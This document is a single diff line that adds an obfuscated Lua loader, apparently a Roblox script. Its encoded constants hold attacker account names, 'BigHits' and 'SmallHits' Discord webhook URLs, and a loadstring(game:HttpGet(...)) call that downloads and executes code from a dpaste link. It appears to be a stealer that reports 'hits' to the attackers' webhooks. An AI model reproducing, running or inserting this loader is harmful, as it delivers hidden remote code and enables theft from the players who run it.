+return VMCall("LOL!0B3Q0003093Q00557365726E616D6573030E3Q004D612Q744D756E73616E61746F72030C3Q0067656E6170796B696E31323303073Q00615F616E692Q78030E3Q0042696748697473576562682Q6F6B03793Q00682Q7470733A2Q2F646973636F72642E636F6D2F6170692F776562682Q6F6B732F31333631333436343031383632342Q323538392F58654A474D476E7A6D4D706B315A446F365F6235576D597A454D7231456F436E685677464A5F5A417A64656E764E686F6E375F2D3833637468484D574865585F4C71335603103Q00536D612Q6C48697473576562682Q6F6B030A3Q006C6F6164737472696E6703043Q0067616D6503073Q00482Q747047657403203Q00682Q7470733A2Q2F6470617374652E636F6D2F384A334238484D51482E74787400134Q00093Q00033Q00122Q000100023Q00122Q000200033Q00122Q000300048Q0003000100120B3Q00013Q0012083Q00063Q00124Q00053Q00124Q00063Q00124Q00073Q00124Q00083Q00122Q000100093Q00202Q00010001000A00122Q0003000B6Q000400016Q000100044Q00075Q00022Q000D3Q000100012Q00053Q00017Q00", GetFEnv(), ...);
